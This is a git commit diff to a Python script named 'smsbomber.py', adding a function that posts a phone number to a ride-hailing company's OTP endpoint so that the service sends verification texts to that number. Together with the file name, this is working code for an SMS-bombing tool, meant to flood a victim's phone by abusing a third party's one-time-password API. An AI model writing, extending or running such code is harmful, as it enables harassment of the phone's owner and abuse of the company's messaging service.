66012d0eda55751af83c9de76e1a4b8aef022a88
krishpranav <krisna.pranav@gmail.com>
2021-04-22 09:42:49 +0530

    added sms function

--- smsbomber.py
+++ smsbomber.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env/python3
 
 #imports
-from colrama import Fore
+from colorama import Fore
 import subprocess
 import requests
 import platform
@@ -15,3 +15,19 @@ def clear():
         subprocess.call(("clear"),shell=True)
 
 clear()
+
+def sendsms(number):
+    payload = {
+        "cellphone":number
+    }
+    result = requests.post(
+    'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp/',
+    data=payload
+    )
+    # print(result.text)
+    if result.status_code == 200:
+        status = True
+    else:
+        status = False
+        
+    return status
